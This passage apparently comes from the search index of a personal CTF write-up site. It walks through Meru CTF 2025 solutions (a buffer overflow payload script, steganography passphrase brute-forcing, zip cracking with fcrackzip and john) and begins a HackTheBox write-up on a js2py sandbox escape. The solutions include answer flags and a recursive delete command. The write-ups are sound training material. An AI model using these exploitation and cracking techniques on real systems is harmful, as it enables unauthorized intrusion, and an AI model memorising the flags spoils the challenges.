print_flag and vulnerable</p> <p></p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/vaultkeeper/#code-summary","title":"Code Summary","text":"<ul> <li> <p><code>intro()</code>\u00a0prints the welcome messages.</p> </li> <li> <p><code>vulnerable()</code>\u00a0reads user input but does not print the flag.</p> </li> <li> <p><code>main()</code>\u00a0calls\u00a0<code>intro()</code>, then\u00a0<code>vulnerable()</code>, and finally prints \"The vault remains sealed.\"</p> </li> <li> <p>The flag is printed only by\u00a0<code>print_flag()</code>, which is never called directly in\u00a0<code>main()</code>.</p> </li> </ul> <p>What this means is that the program expects an input, but no input alone will cause the flag to be printed. </p> <p>print_flag function :</p> <p></p> <p>vulnerable function:</p> <p></p> <p>To get the flag output, you need to exploit the buffer overflow vulnerability in\u00a0<code>vulnerable()</code>\u00a0(because it uses\u00a0<code>gets()</code>\u00a0unsafely) to overwrite the return address and redirect execution to the\u00a0<code>print_flag()</code>\u00a0function.</p> <p>This is a classic binary exploitation scenario where you provide a crafted input (payload) that overflows the buffer and hijacks control flow.</p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/vaultkeeper/#exploitation","title":"Exploitation","text":""},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/vaultkeeper/#step-1-determine-the-offset-to-the-return-address","title":"Step 1: Determine the Offset to the Return Address","text":"<p>The buffer size is 64 bytes. On a typical x86_64 system, the return address is located after the buffer and the saved frame pointer (RBP). Therefore, the offset to the return address is:</p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/vaultkeeper/#step-2-find-the-address-of-print_flag","title":"Step 2: Find the Address of\u00a0<code>print_flag()</code>","text":"<p>Use a tool like\u00a0<code>objdump</code>,\u00a0<code>nm</code>, or Ghidra to find the memory address of the\u00a0<code>print_flag()</code>\u00a0function. For example:</p> <pre><code>nm -C ./glory | grep print_flag\n</code></pre> <p></p>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/vaultkeeper/#step-3-craft-the-payload","title":"Step 3: Craft the Payload","text":"<p>Create a payload that overflows the buffer and overwrites the return address with the address of\u00a0<code>print_flag()</code>. Here's a Python script to generate the payload:</p> <pre><code>from struct import pack\n\n# Define the sizes and addresses\nbuffer_size = 64\nsaved_rbp_size = 8\nret_addr = 0x401199  # Place the actual print_flag address\n\n# Craft the payload\npayload = b\"A\" * buffer_size       # Fill the buffer with 'A's\npayload += b\"B\" * saved_rbp_size   # Overwrite the saved RBP with 'B's\npayload += pack(\"&lt;Q\", ret_addr)    # Overwrite the return address with print_flag address (little endian)\n\nprint(payload)\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/vaultkeeper/#step-4-run-the-exploit","title":"Step 4: Run the Exploit","text":"<p>Save the payload to a file or pipe it into the program. For example:</p> <pre><code>python exploit.py &gt; payload\n./glory &lt; payload\n</code></pre> <p>Or directly pipe the output:</p> <pre><code>python exploit.py | ./glory\n</code></pre> <p></p> <p>It however did not work because the exploit had an issue. Pending creation of the exploit, I knew that the flag is stored in the print_flag function, but it is encoded as a series of 64-bit hexadecimal values assigned to local variables, then printed as a flag as a string The values represent parts of the flag in memory. To find the flag, you need to convert these hex values into ASCII characters and concatenate them.</p> <p>NB  :  You need to convert the hexadecimal values into\u00a0little-endian byte order\u00a0because that is how the data is stored in memory of the target machine (which is almost certainly a little-endian architecture like x86 or x86_64)</p> <p>I thus created a script which will decode the flag from the hexadecimal values you provided, following the little-endian byte order, and prints out the full flag.</p> <pre><code>def decode_flag():\n    # Hex values from the print_flag function\n    hex_values = [\n        0x5f306e7b67616c66,\n        0x77306c6672337630,\n        0x72306c675f306e5f,\n        0x7d79\n    ]\n\n    flag_bytes = b\"\"\n\n    for val in hex_values:\n        # Determine how many bytes to extract (8 bytes for full 64-bit values, less for the last)\n        length = 8 if val &gt; 0xFFFF else 2\n\n        # Convert the integer to bytes in little-endian order\n        flag_bytes += val.to_bytes(length, byteorder='little')\n\n    # Decode the concatenated bytes to ASCII string\n    flag = flag_bytes.decode('ascii')\n\n    print(\"[+] Decoded flag:\", flag)\n\nif __name__ == \"__main__\":\n    decode_flag()\n</code></pre> <p></p> <pre><code>Flag : flag{n0_0v3rfl0w_n0_gl0ry}\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/binary%20exploitation/Vaultkeeper%20-Strings%20will%20not%20save%20you/vaultkeeper/#how-the-above-python-code-works","title":"How the above python code works:","text":"<ul> <li> <p>Each 64-bit integer is converted to bytes in little-endian byte order.</p> </li> <li> <p>The last value is shorter (only 2 bytes).</p> </li> <li> <p>All bytes are concatenated and decoded to ASCII.</p> </li> <li> <p>The script prints the decoded flag.</p> </li> </ul>"},{"location":"writeups/competitions/meru-ctf-2025/cryptography/Crypto/","title":"Crypto","text":""},{"location":"writeups/competitions/meru-ctf-2025/cryptography/Crypto/#description","title":"Description","text":"<p>A strange encrypted message was discovered in an old backup, buried under layers of weak but cleverly stacked ciphers. It looks simple\u2014maybe too simple. Can you break through the layers and uncover the flag?</p>"},{"location":"writeups/competitions/meru-ctf-2025/cryptography/Crypto/#challenge","title":"Challenge","text":"<p>I opened the contents of the file</p> <pre><code>cat crypto_challenge1.txt\n</code></pre> <p></p>"},{"location":"writeups/competitions/meru-ctf-2025/cryptography/Crypto/#solution","title":"Solution","text":"<p>We are provided with a file containing some descriptions and an encrypted message: <code>c3ludHtmMzNfMWdmX2d1NGdfMzRmbH0=</code></p> <p>The presence of the trailing\u00a0<code>=</code>\u00a0suggests the message is Base64 encoded. To decode it, we can use online tools like\u00a0CyberChef\u00a0or\u00a0dcode.fr, but I prefer using the terminal:</p> <pre><code>echo \"c3ludHtmMzNfMWdmX2d1NGdfMzRmbH0=\" | base64 -d  \n</code></pre> <p></p> <p>The decoded string looks like a flag but appears to be encoded with another cipher. Recognizing the pattern, it is likely <code>ROT13</code>, which shifts each alphabet letter 13 places forward, wrapping around the alphabet, while numbers and symbols remain unchanged. This selective letter substitution is a hallmark of <code>ROT13</code> encoding.</p> <p>Applying <code>ROT13</code> using <code>CyberChef</code> or <code>dcode.fr</code> reveals the actual flag.</p> <p>Alternatively, you can decode <code>ROT13</code> in the terminal using the\u00a0<code>tr</code>\u00a0command <code>tr is used to translate or delete characters</code></p> <pre><code>echo \"synt{f33_1gf_gu4g_34fl}  \" | tr 'A-Za-z' 'N-ZA-Mn-za-m' \n</code></pre> <p></p> <pre><code>FLAG : flag{s33_1ts_th4t_34sy} \n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/forensics/Red-Mystery/Red-Mystery/","title":"Red Mystery","text":""},{"location":"writeups/competitions/meru-ctf-2025/forensics/Red-Mystery/Red-Mystery/#description","title":"Description","text":"<p>\"Sometimes the most colourful thoughts are worth writing down. When the clouds speak in riddles, perhaps it's worth turning their words into keys.\" The answer might be hiding in what's said, not just what's seen. Something about this photo doesn't feel natural. Can you discover its hidden secret?</p>"},{"location":"writeups/competitions/meru-ctf-2025/forensics/Red-Mystery/Red-Mystery/#hint","title":"Hint","text":"<p>Ever heard of a wordlist ...!!!</p>"},{"location":"writeups/competitions/meru-ctf-2025/forensics/Red-Mystery/Red-Mystery/#solution","title":"Solution","text":"<p>When I first opened the image, I saw a tarmac road bordered by trees, with what appeared to be a sunset in the background. Although the scene looked ordinary at first glance, the challenge description made me suspect there was more beneath the surface.</p> <p>My initial approach was to examine the image\u2019s metadata using\u00a0<code>exiftool</code>. This tool is excellent for uncovering hidden information embedded in files. Running the command:</p> <pre><code>exiftool challenge.jpg  \n</code></pre> <p></p> <p>I carefully reviewed the output and noticed an intriguing comment <code>Aint sth good like when the cloud is purple</code></p> <p>This comment stood out as it seemed deliberately placed and possibly relevant to the challenge.</p> <p>Suspecting there might be hidden data, I next tried extracting information using\u00a0<code>steghide</code></p> <pre><code>steghide extract -sf challenge.jpg \n</code></pre> <p></p> <p>However,\u00a0<code>steghide</code>\u00a0prompted me for a passphrase, which I didn't have. At this point, I decided to use a brute-force approach with\u00a0<code>stegseek</code>, leveraging the popular\u00a0<code>rockyou.txt</code>\u00a0wordlist</p> <pre><code>stegseek challenge.jpg /usr/share/wordlists/rockyou.txt\n</code></pre> <p></p> <p>After some time,\u00a0<code>stegseek</code>\u00a0successfully found the passphrase \"purplecloud\"</p> <p>It also revealed that the hidden file was named\u00a0<code>flagged.xcf</code>\u00a0and extracted it as\u00a0<code>challenge.jpg.out</code>. Since\u00a0<code>.xcf</code>\u00a0is the native file format for GIMP, I opened this file in GIMP to investigate further. Upon opening it, I found the flag embedded within the image layers.</p> <p>Alternatively, for a quicker approach, I used the\u00a0<code>strings</code>\u00a0command to search for flag-like patterns directly in the extracted file:</p> <pre><code>strings challenge.jpg.out | grep flag{\n</code></pre> <p></p> <pre><code>FLAG : flag{r3ds_are_susp1c10us}\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/forensics/Stewie%27s%20Final%20Route/Stewie%27s%20Final%20Route/","title":"Stewie's Final Route","text":""},{"location":"writeups/competitions/meru-ctf-2025/forensics/Stewie%27s%20Final%20Route/Stewie%27s%20Final%20Route/#description","title":"Description","text":"<p>Thanks for helping me figure out where I was before getting lost during the maandamano - I owe you one! But the journey isn't over yet. See, I'm a man of clues - I always leave trails behind. And guess what? I left a visual clue in the first image i SENT YOU. Now that my friend helped me remember where I was, I noticed something else: he didn't just leave me a clue - he also left me the location of the t3rmin4t0rs Flash CTF! But it's conealed. He gave me a hint: \"To retrieve the file holding the location, you'll need a passphrase. The passphrase is a 10-letter word. It's the name of the place you're close to - it can be seen\"</p>"},{"location":"writeups/competitions/meru-ctf-2025/forensics/Stewie%27s%20Final%20Route/Stewie%27s%20Final%20Route/#hint","title":"Hint","text":"<p>Ayy I already gave you hint... But I look closely in the image you'll get</p>"},{"location":"writeups/competitions/meru-ctf-2025/forensics/Stewie%27s%20Final%20Route/Stewie%27s%20Final%20Route/#solution","title":"Solution","text":"<p>Even before we proceed, we obtain some crucial information from the description alone:</p> <ol> <li> <p>We will need a\u00a0passphrase\u00a0to retrieve the hidden file containing the location of the CTF.</p> </li> <li> <p>The passphrase is a\u00a010-letter word, which is the name of a place visible in the image.</p> </li> <li> <p>There is a\u00a0visual clue hidden inside the image\u00a0that hints at this passphrase.</p> </li> </ol> <p>Given these clues, it\u2019s clear that\u00a0steganography tools like steghide or stegseek\u00a0will be needed to extract the concealed data using the passphrase.</p> <p>Opening the image, I noticed it resembled the first Stewie challenge (Where\u2019s Stewie?), but this time Stewie was standing. In the background, there was a lake, a tree, a flagpost, and a building. A quick reverse image search revealed it was the\u00a0parliament.</p> <p></p> <p>Wait..., <code>parliament</code>\u00a0is a perfect 10-letter word!</p> <p>Without hesitation, I jumped direct to <code>steghide</code></p> <pre><code>steghide extract -sf picnic1.jpg  \n</code></pre> <p></p> <p>Alas, the passphrase <code>parliament</code> is correct. </p> <p>Trying to unzip the <code>secret_flag.zip</code> file, it prompts for a password, which I didn't know.</p> <pre><code>unzip secret_flag.zip                                              \n</code></pre> <p></p> <p>Time to crack it. I launched\u00a0<code>fcrackzip</code>\u00a0with the <code>rockyou</code> wordlist:</p> <pre><code>fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt secret_flag.zip \n</code></pre> <p></p> <p>Similarly, we can use john the ripper to crack it</p> <pre><code>zip2john secret_flag.zip &gt; hash \n\njohn -w=/usr/share/wordlists/rockyou.txt hash\n</code></pre> <p>We find the password as : <code>password</code></p> <p>With the password in hand, I extracted the zip, I found a file containing the flag</p> <pre><code>unzip secret_flag.zip\n</code></pre> <p></p> <p>And thus opening the file revealed the flag </p> <pre><code>cat secret_flag.txt       \n</code></pre> <p></p> <pre><code>FLAG : flag{d33ply_c0nc34l3d}\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/forensics/Where%27s%20Stewie/Where%27s%20Stewie/","title":"Where's Stewie","text":""},{"location":"writeups/competitions/meru-ctf-2025/forensics/Where%27s%20Stewie/Where%27s%20Stewie/#description","title":"Description","text":"<p>Hey, it's me - Stewie Griffin. I heard the t3rmin4tors are hosting a Flash CTF in Nairobi, and naturally, I had to show up to dominate. But things went totally sideways during the maandamano. Long story short: chaos, tear gas and somehow I landed in a place I don't even remember! My friend left me a clue about where I was before I got lost - it's hidden somewhere inside this image I snapped before everything went dark. Can you help me figure out where I was before I vanished? All I want is to make it to the CTF on time. Find out where the clue is!</p>"},{"location":"writeups/competitions/meru-ctf-2025/forensics/Where%27s%20Stewie/Where%27s%20Stewie/#solution","title":"Solution","text":"<p>First, I opened the image to check what it showed. It was a picture of me having a picnic in the park. In the background, I noticed a small lake and a building that looked like the parliament. That seemed like a good starting point.</p> <p>Next, I ran\u00a0<code>exiftool</code>\u00a0on the image to inspect its metadata</p> <pre><code>exiftool picnic.png            \n</code></pre> <p></p> <p>The output revealed a lot of standard info, but one thing caught my eye \u2014 the\u00a0Description\u00a0field contained this string <code>`666c61677b315f7734355f683372337d</code></p> <p>At first, I thought it might be a hash, but it didn\u2019t match common hash formats like MD5 or SHA256. Instead, it looked like a hexadecimal-encoded ASCII string.</p> <p>To decode it, I used the\u00a0<code>xxd</code>\u00a0command and it gave me the flag</p> <pre><code>echo \"666c61677b315f7734355f683372337d\" | xxd -r -p\n</code></pre> <p></p> <ul> <li> <p>The command\u00a0<code>xxd -r -p</code>\u00a0converts a plain hex string back into readable text or binary.</p> </li> <li> <p><code>-r</code>\u00a0means reverse the hex dump back to original data.</p> </li> <li><code>-p</code>\u00a0means the input is a continuous hex string without extra formatting.</li> </ul> <p>So the clue was right there in the metadata \u2014 a hex-encoded flag telling me exactly where I was before I vanished.</p> <pre><code>FLAG : flag{1_w45_h3r3}\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/misc/Maze%20of%20Lies/Maze%20of%20Lies/","title":"Maze of Lies","text":""},{"location":"writeups/competitions/meru-ctf-2025/misc/Maze%20of%20Lies/Maze%20of%20Lies/#description","title":"Description","text":"<p>Stay focused...!!! Can you find the needle in the static?</p>"},{"location":"writeups/competitions/meru-ctf-2025/misc/Maze%20of%20Lies/Maze%20of%20Lies/#solution","title":"Solution","text":"<p>First was to extract files from the zip file given </p> <pre><code>unzip maze_of_lies.zip \n</code></pre> <p></p> <p>The archive exploded into multiple folders (<code>logs</code>,\u00a0<code>docs</code>,\u00a0<code>data</code>,\u00a0<code>2022</code>,\u00a0<code>misc</code>) filled with tons of log and text files\u2014almost like a zip bomb. Navigating through all of them would be tedious.</p> <p>To simplify, I listed the archive contents with the <code>-l</code> flag. This showed file names, sizes, and timestamps without extracting</p> <pre><code>unzip -l maze_of_lies.zip \n</code></pre> <p></p> <p>Scanning through, I spotted an unusual file. All of the files had a 4 digit length but this one had 3 digits</p> <p></p> <p>To print the file contents directly without extracting it, I used the <code>-p</code> flag and the output was :</p> <pre><code>unzip -p maze_of_lies.zip logs/notes/old/real_note.txt\n</code></pre> <p></p> <p>Recognizing <code>base64</code> encoding, I decoded both strings:</p> <pre><code> echo \"bWF5YmUgeW91J3ZlIGZvdW5kIHRoZSBmbGFnLCBvciBtYXliZSBub3QuCg==\" | base64 -d\n</code></pre> <p></p> <pre><code>echo \"ZmxhZ3swbmx5XzBuZV90cnVlX2YxbGVfaW5fdGgzX21hemV9\" | base64 -d\n</code></pre> <p></p> <p>This approach saved me from extracting hundreds of files and quickly led me to the flag hidden in a small, overlooked file</p> <pre><code>FLAG : flag{0nly_0ne_true_f1le_in_th3_maze}\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/misc/QRious%20S3cr3et5/QRious%20S3cr3t5/","title":"QRious S3cr3t5","text":""},{"location":"writeups/competitions/meru-ctf-2025/misc/QRious%20S3cr3et5/QRious%20S3cr3t5/#description","title":"Description","text":"<p>A mysterious QR code has been found printed on a sticky note at a hacker's desk. It seems like just an ordinary QR code... or is it?</p>"},{"location":"writeups/competitions/meru-ctf-2025/misc/QRious%20S3cr3et5/QRious%20S3cr3t5/#solution","title":"Solution","text":"<p>The challenge had 2 downloadable files. First, I tried extracting the zip, but it was password protected. I attempted cracking it with\u00a0<code>fcrackzip</code>\u00a0and\u00a0<code>john the ripper</code>\u2014no luck</p> <p>So, I turned to the QR code. On Linux, I used\u00a0<code>zbarimg</code>\u00a0to scan it</p> <pre><code>zbarimg challenge_qr.png              \n</code></pre> <p></p> <pre><code>output : ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;.+.+++++++++++.&lt;&lt;++++++++++++++++++.&gt;&gt;+.&lt;&lt;+++.\n</code></pre> <p>This looked like\u00a0Brainfuck\u00a0code from a previous CTF I did. I decoded it on\u00a0dcode.fr\u00a0and got</p> <pre><code>dep0q3\n</code></pre> <p></p> <p>I tried this as the zip password, but it failed. Seeing the format of that password, it hinted at a <code>ROT13</code> cipher, SO i DECODED IT</p> <pre><code>echo dep0q3 | tr 'A-Za-z' 'N-ZA-Mn-za-m'                           \n</code></pre> <p></p> <p>Using\u00a0<code>qrc0d3</code>\u00a0as the password, I successfully extracted the zip</p> <pre><code>unzip qr_flag.zip  \n</code></pre> <p></p> <p>Finally, I read the flag</p> <pre><code>cat flag.txt                            \n</code></pre> <p></p> <p>This challenge was a clever mix of steganography and cipher </p> <pre><code>FLAG : flag{qr_c0des_ar3_fun}\n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/misc/Select1v3/Select1v3/","title":"Select1v3","text":""},{"location":"writeups/competitions/meru-ctf-2025/misc/Select1v3/Select1v3/#description","title":"Description","text":"<p>Somewhere lies the flag...!!!</p>"},{"location":"writeups/competitions/meru-ctf-2025/misc/Select1v3/Select1v3/#solution","title":"Solution","text":"<p>I was handed a zip file  and upon extracting it, I found a maze of folders and even another zip file nested inside. It was a zip bomb</p> <pre><code>unzip partial.zip      \n</code></pre> <p></p> <p>Faced with this sprawling extraction, my first instinct was to clean house\u2014delete all the extracted clutter so I could start fresh. But I needed to be careful not to delete the original zip file or any other important files.</p> <p></p> <p>To do this, I identified the files I wanted to keep\u2014my\u00a0<code>partial.zip</code>\u00a0and a stray image file called\u00a0<code>pasted image.png</code>. Then, I ran this command to wipe everything else</p> <pre><code>find . -maxdepth 1 ! -name '*.zip' ! -name '.' -exec rm -r {} + \n</code></pre> <p></p> <p>What the command does:</p> <ul> <li> <p><code>find .</code>: Search in the current directory (<code>.</code>).</p> </li> <li> <p><code>-maxdepth 1</code>: Only look at files/directories directly inside the current directory (do not search recursively).</p> </li> <li> <p><code>! -name '*.zip'</code>: Exclude files with the\u00a0<code>.zip</code>\u00a0extension.</p> </li> <li> <p><code>! -name '.'</code>: Exclude the current directory itself from the results.</p> </li> <li> <p><code>rm -r</code>\u00a0recursively deletes directories and their contents.</p> </li> <li> <p>The\u00a0<code>+</code>\u00a0at the end groups multiple files/directories for efficiency.</p> </li> <li> <p>This will delete\u00a0all files and directories\u00a0except\u00a0<code>.zip</code>\u00a0files.</p> </li> </ul> <p> Indeed, every folder was deleted. I accessed the nested_decoy file but it had nothing</p> <p>To view the content of the zip file next without extracting it, I used  <code>-l</code> flag. This showed file names, sizes, and timestamps</p> <pre><code> unzip -l partial.zip                                  \n</code></pre> <p></p> <p>Before even I proceeded further, one line caught my eye, a hint I had missed before : <code>Extract with care. Real base64 flag shards are in home/secrets/flag_*.txt</code> </p> <p>The first thing I thought was to see if indeed there was existence of such a file with the file path  <code>/home/secret</code>, and indeed it was there, e.g</p> <p></p> <p>Next, I now extracted only the files with those file path and outputted in a folder called <code>extracted</code></p> <pre><code>unzip partial.zip \"home/secrets/flag_*.txt\" -d extracted  \n</code></pre> <p></p> <p>Inside the\u00a0<code>extracted/home/secrets</code>\u00a0folder, I found four files named\u00a0<code>flag_1.txt</code>\u00a0through\u00a0<code>flag_4.txt</code>. Their contents looked like fragments of a puzzle</p> <pre><code>cat extracted/home/secrets/flag_*.txt | base64 -d\n</code></pre> <p></p> <p>Recognizing these as <code>Base64-encoded strings</code>, I combined and decoded them in one go</p> <pre><code>cat extracted/home/secrets/flag_*.txt | base64 -d\n</code></pre> <p></p> <p>And just like that, the flag revealed itself.</p> <pre><code>FLAG : flag{3xtr4ct_0nly_wh4t_m4tt3rs} \n</code></pre>"},{"location":"writeups/competitions/meru-ctf-2025/misc/Welcome%20Fl4g/Welcome%20Fl4g/","title":"Welcome Fl4g","text":""},{"location":"writeups/competitions/meru-ctf-2025/misc/Welcome%20Fl4g/Welcome%20Fl4g/#description","title":"Description","text":"<p>As a curious web crawler, you\u2019ve landed on the t3rmin4t0rs CTF server. But not everything is visible at first glance\u2026 some things are hidden in plain sight. Can you find the first flag the admins didn\u2019t want bots to see?</p>"},{"location":"writeups/competitions/meru-ctf-2025/misc/Welcome%20Fl4g/Welcome%20Fl4g/#solution","title":"Solution","text":"<p>When exploring\u00a0any website, one\u00a0of the first\u00a0places a curious\u00a0web crawler\u2014or anyone\u00a0interested in\u00a0reconnaissance\u2014should check\u00a0is the\u00a0<code>robots.txt</code>\u00a0file. </p> <p>This is a simple\u00a0text file located\u00a0in the root directory\u00a0of a website\u00a0that serves as\u00a0a set of instructions\u00a0for web crawlers or bots. Its\u00a0primary purpose\u00a0is to guide these\u00a0bots on which\u00a0parts of the\u00a0site they are\u00a0allowed or disallowed to access\u00a0and index. </p> <p>While\u00a0it doesn\u2019t enforce\u00a0access restrictions, well-behaved bots\u00a0usually respect\u00a0these directives\u00a0to avoid crawling\u00a0sensitive or\u00a0irrelevant sections\u00a0of the site.</p> <p>Knowing that many websites use a\u00a0<code>robots.txt</code>\u00a0file to guide web crawlers, I navigated to</p> <pre><code>http://&lt;target-server&gt;/robots.txt\n</code></pre> <p>Opening the\u00a0<code>robots.txt</code>\u00a0file, I found a suspicious string that looked like <code>Base64</code> encoded data rather than the usual disallow rules.</p> <p>I copied the string </p> <pre><code>ZmxhZ3t3M2xjMG0zX3QwX3Qzcm1pbjR0MHJzX2ZsNHNoX2N0Zn0=\n</code></pre> <p>and decoded it using the command:</p> <pre><code>echo \"ZmxhZ3t3M2xjMG0zX3QwX3Qzcm1pbjR0MHJzX2ZsNHNoX2N0Zn0=\" | base64 -d\nflag{w3lc0m3_t0_t3rmin4t0rs_fl4sh_ctf} \n</code></pre> <pre><code>FLAG : flag{w3lc0m3_t0_t3rmin4t0rs_fl4sh_ctf}\n</code></pre>"},{"location":"writeups/platforms/","title":"Platforms","text":"<p>Welcome to my cybersecurity platform writeups!</p> <p>This section contains detailed writeups from the platforms I\u2019ve been working on.  Each platform hosts multiple challenges or rooms to strengthen your hands-on skills.</p>"},{"location":"writeups/platforms/#hackthebox","title":"HackTheBox","text":"<ul> <li>Easy Rooms</li> <li>Medium Rooms (Coming Soon)</li> <li>Hard Rooms (Coming Soon)</li> <li>Insane (Coming Soon)</li> </ul>"},{"location":"writeups/platforms/#overthewire","title":"OverTheWire","text":"<ul> <li>Natas</li> <li>Bandit (Coming Soon)</li> </ul>"},{"location":"writeups/platforms/#tryhackme","title":"TryHackMe","text":"<ul> <li>Easy Rooms</li> <li>Medium Rooms (Coming Soon)</li> <li>Hard Rooms (Coming Soon)</li> </ul>"},{"location":"writeups/platforms/#vulnhub","title":"VulnHub","text":"<p>VulnHub writeups are divided into two categories for clarity:</p> <ul> <li>Single Machines </li> <li>Series Machines</li> </ul>"},{"location":"writeups/platforms/hackthebox/","title":"HackTheBox Writeups\u00b6","text":"<p>TryHackMe provides hands\u2011on cybersecurity labs that reinforce practical exploitation skills.</p> <p>This section contains my curated collection of room writeups \u2014 structured, concise, and focused on methodology.</p>"},{"location":"writeups/platforms/hackthebox/#difficulty-categories","title":"Difficulty Categories\u00b6","text":"<p>Choose a tier and dive in:</p> <ul> <li>Easy Machines</li> <li>Medium Machines</li> <li>Hard Machines.</li> <li>Insane Machines</li> </ul> <p>This collection grows continuously as I grind more rooms, sharpen skills, and prepare for professional certifications.</p>"},{"location":"writeups/platforms/hackthebox/easy/","title":"Easy Machines\u00b6","text":"<p>This section features beginner-friendly TryHackMe machines designed for foundational skills in reconnaissance, enumeration, and basic exploitation. Each room emphasizes practical learning with guided environments ideal for newcomers to cybersecurity.</p>"},{"location":"writeups/platforms/hackthebox/easy/#completed-machines","title":"Completed Machines\u00b6","text":"<ul> <li>CodePartTwo</li> </ul> <p>More easy machines will be added as progress continues through TryHackMe's beginner track.</p>"},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/","title":"codePartTwo","text":"<p>Category : Linux Difficulty : Easy</p>"},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/#synopsis","title":"Synopsis","text":"<p>CodePartTwo is an Easy Linux Hack The Box machine that revolves around a custom Flask web application. The application allows users to submit and execute JavaScript code server-side using the js2py library. Due to an outdated and vulnerable version of js2py, the application is susceptible to a sandbox escape (CVE-2024-28397), allowing remote code execution.</p> <p>By exploiting this vulnerability, I obtained an initial shell on the system, extracted credential hashes from a SQLite database, pivoted to another user via SSH, and finally escalated privileges to root through a misconfigured <code>sudo</code> permission on <code>npbackup-cli</code>.</p>"},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/#reconnaissance","title":"Reconnaissance","text":"<p>I began with a Rustscan, which revealed two open ports on the target:</p> <ul> <li>22/tcp \u2013 SSH</li> <li>8000/tcp \u2013 HTTP</li> </ul> <pre><code>rustscan -a 10.129.14.51 -- -sC -sV\n</code></pre> <p></p> <p>So, in the rustscan syntax, the -- enables us to pass the nmap commands -sC and -sV and thus nmap is ran</p> <p></p>"},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/#enumeration","title":"Enumeration","text":"<p>With port 8000 open, I navigated to the web application in the browser.</p> <p></p> <p>The landing page presented three main options:</p> <ul> <li>Login</li> <li>Register</li> <li>Download App</li> </ul> <p>While the application was downloading, I proceeded to enumerate the web server using Gobuster.</p> <pre><code>gobuster dir -u http://10.129.14.51:8000/ -w /usr/share/wordlists/dirb/common.txt \n</code></pre> <p></p> <p>The directories discovered matched what was already exposed by the web interface, so no hidden paths of interest were found at this stage.</p>"},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/#application-analysis","title":"Application Analysis","text":"<p>Clicking Download App returned a ZIP archive. Extracting it revealed the source code for the web application.</p> <p></p> <p>Before interacting further with the live site, I decided to review the source code locally. The first file I inspected was <code>app.py</code>. Almost immediately, I noticed two sensitive values hardcoded in the application:</p> <pre><code>app.secret_key = 'S3cr3tK3yC0d3PartTw0'\napp.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'\n</code></pre> <p></p> <p>The presence of a local SQLite database prompted me to inspect it using <code>sqlite3</code>.</p> <pre><code>sqlite3 users.db\n\nsqlite&gt; .tables\nsqlite&gt; SELECT * FROM user;\nsqlite3 SELECT * FROM code_snippet;\n</code></pre> <p></p> <p>Two tables were present: <code>user</code> and <code>codesnippet</code>. However, both tables were empty at this point.</p> <p>I continued reviewing the rest of the application files and examined <code>requirements.txt</code>.</p> <p></p> <p>At this stage, I had a clear understanding of the technology stack and application layout.</p>"},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/#application-structure","title":"Application Structure","text":"<p>The <code>requirements.txt</code> confirmed that this was a custom Flask application</p> <p>Key components included:</p> <ul> <li> <p>Flask 3.0.3     Used for routing (<code>/login</code>, <code>/register</code>, <code>/dashboard</code>), templating with Jinja2, and session     handling via the previously discovered <code>secret_key</code>.</p> </li> <li> <p>Flask-SQLAlchemy 3.1.1     Handles database interactions with the SQLite database <code>users.db</code>.</p> </li> <li> <p>js2py 0.74     Executes JavaScript code inside Python, likely used to process user-submitted code from the  dashboard.</p> </li> </ul> <p>The directory structure followed a standard Flask layout:</p> <ul> <li><code>app.py</code> \u2013 Application logic and routes </li> <li><code>templates/</code> \u2013 HTML templates</li> <li><code>static/</code> \u2013 JavaScript and CSS</li> <li><code>instance/</code> \u2013 SQLite database</li> </ul>"},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/#web-application-interaction","title":"Web Application Interaction","text":"<p>With the application structure understood, I returned to the live site and created an account. After logging in, I was redirected to a dashboard containing a JavaScript code editor with Run and Save functionality.</p> <p></p> <p>The editor included placeholder JavaScript code. I rewrote it slightly and executed it to observe the behavior.</p> <pre><code>var x = 16;\nx;\n</code></pre> <p></p> <p>The output correctly returned <code>16</code>, confirming that the JavaScript was being executed on the server.</p>"},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/#understanding-the-execution-logic","title":"Understanding the Execution Logic","text":"<p>From both code review and testing, the execution flow became clear:</p> <ul> <li>User submits JavaScript code via the dashboard</li> <li>The code is sent via POST to a Flask route</li> <li><code>app.py</code> executes the code using <code>js2py.eval_js()</code></li> <li>The result is returned and rendered in the browser</li> </ul> <p>In short, the user-supplied JavaScript was executed server-side using js2py.</p> <p>This immediately raised a red flag, especially given the js2py version in use.</p>"},{"location":"writeups/platforms/hackthebox/easy/codePartTwo/codePartTwo/#vulnerability-discovery","title":"Vulnerability Discovery","text":"<p>The application was using js2py version 0.74, which is affected by a known sandbox escape vulnerability, CVE-2024-28397: js2py Sandbox Escape Exploit</p> <pre><code>CVE-2024-28397 \u2013 js2py Sandbox Escape\n\nA critical remote code execution (RCE) vulnerability exists in **js2py \u2264 0.74** that allows attackers to escape the JavaScript sandbox and execute arbitrary system commands. Tracked as **CVE-2024-28397** (CVSS 9.8), the issue stems from incomplete 